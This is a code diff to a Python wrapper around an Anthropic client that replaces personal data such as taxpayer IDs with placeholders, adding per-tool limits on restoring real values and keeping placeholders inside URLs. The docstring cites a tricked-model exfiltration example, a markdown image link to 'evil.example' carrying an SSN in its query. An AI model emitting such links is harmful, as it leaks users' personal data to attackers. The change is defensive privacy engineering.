@@ -30,6 +30,14 @@ request is checked first: what it finds becomes a placeholder too, and
 anything else it objects to stops the request.  In a reply, a taxpayer ID it
 finds is taken out, and a reply it objects to is replaced with a note.
 
+A placeholder in a reply's text or a tool call comes back as its real value,
+except inside a URL or a link's target, where it stays a placeholder: text
+the model was tricked into writing ("![](https://evil.example/?d=SSN_001)")
+can't carry a real value off when it's shown or fetched (``restore_urls=True``
+lets it).  ``restore`` says which kinds each tool gets back, so a tool that
+sends things out can be kept to placeholders:
+``restore={"add_member": {"NAME", "SSN"}, "*": set()}``.
+
 Streaming isn't supported yet: ``stream=True`` raises, and so do
 ``messages.stream``, ``parse``, ``batches``, ``tool_runner`` and the raw
 response forms, which would otherwise send the request without placeholders.
@@ -41,7 +49,7 @@ import base64
 import copy
 import hashlib
 from dataclasses import dataclass, field
-from typing import Any, Callable
+from typing import Any, Callable, Collection, Mapping
 
 from veil.redactor import Redactor
 from veil.tax_ids import TAX_ID_KINDS
@@ -98,8 +106,13 @@ class Session:
     """One conversation's redactor and guardrail, and the request and reply handling ``wrap`` uses."""
 
     def __init__(self, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
-                 files: str | Callable[[bytes, str], str] = "refuse"):
+                 files: str | Callable[[bytes, str], str] = "refuse",
+                 restore: Mapping[str, Collection[str] | str | None] | None = None, restore_urls: bool = False):
         self.redactor = redactor if redactor is not None else Redactor()
+        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.
+        self.restore = {name: {kinds} if isinstance(kinds, str) else None if kinds is None else set(kinds)
+                        for name, kinds in (restore or {}).items()}
+        self.restore_urls = restore_urls
         self.guardrail = guardrail
         self.redact_system = redact_system
         if files == "read":
@@ -304,9 +317,12 @@ class Session:
         for i, block in enumerate(content):
             kind = block.get("type") if isinstance(block, dict) else getattr(block, "type", None)
             if kind == "text":
-                self._set(content, i, block, "text", self.redactor.restore_text(self._get(block, "text")))
+                self._set(content, i, block, "text",
+                          self.redactor.restore_text(self._get(block, "text"), urls=self.restore_urls))
             elif kind == "tool_use":
-                self._set(content, i, block, "input", self.redactor.restore(self._get(block, "input")))
+                kinds = self.restore.get(self._get(block, "name"), self.restore.get("*"))
+                self._set(content, i, block, "input",
+                          self.redactor.restore(self._get(block, "input"), kinds, urls=self.restore_urls))
         return response
 
     def _guard_reply(self, content: list) -> None:
@@ -420,10 +436,16 @@ class VeiledClient:
 
 
 def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
-         files: str | Callable[[bytes, str], str] = "refuse") -> VeiledClient:
+         files: str | Callable[[bytes, str], str] = "refuse",
+         restore: Mapping[str, Collection[str] | str | None] | None = None,
+         restore_urls: bool = False) -> VeiledClient:
     """``client`` (anthropic.Anthropic, AnthropicBedrock ...) with placeholders on the way out and real values
     on the way back.  Use one per conversation, or pass the conversation's ``redactor``.
 
     ``files`` says what happens to images and PDFs: "refuse" the request (the default), "read" their text
-    here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them."""
-    return VeiledClient(client, Session(redactor, guardrail, redact_system, files))
+    here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them.
+
+    ``restore`` says which placeholder kinds each tool's calls get back as real values, by tool name, with
+    ``"*"`` for any tool not named (``{"add_member": {"NAME", "SSN"}, "*": set()}``); a tool it doesn't cover
+    gets every kind.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders)."""
+    return VeiledClient(client, Session(redactor, guardrail, redact_system, files, restore, restore_urls))
